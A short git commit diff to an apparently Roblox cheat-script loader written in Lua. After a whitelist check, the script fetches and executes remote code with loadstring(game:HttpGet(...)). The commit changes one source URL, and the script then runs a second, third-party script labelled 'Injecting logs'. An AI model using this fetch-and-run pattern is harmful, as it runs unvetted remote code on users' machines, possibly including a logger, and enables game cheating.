51f4cd2e81d080287008515266e06a45a563833b
spiderboy764 <109308746+spiderboy764@users.noreply.github.com>
2022-12-18 03:08:45 -0600

    Update main.lua

--- main.lua
+++ main.lua
@@ -3,7 +3,7 @@ if _G.Key == 1 then
     if USERTable[game.Players.LocalPlayer.Name] then
         _G.Key = 2
         print(_G.Key)
-        loadstring(game:HttpGet("https://pastebin.com/raw/mCCUSYeQ", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/spiderboy764/dontskidladalaw/main/douinky.lua", true))()
         print("Whitelisted Script")
         print("Injecting logs...")
         loadstring(game:HttpGet("https://raw.githubusercontent.com/tnbian/ruin/main/dontskidlol", true))()
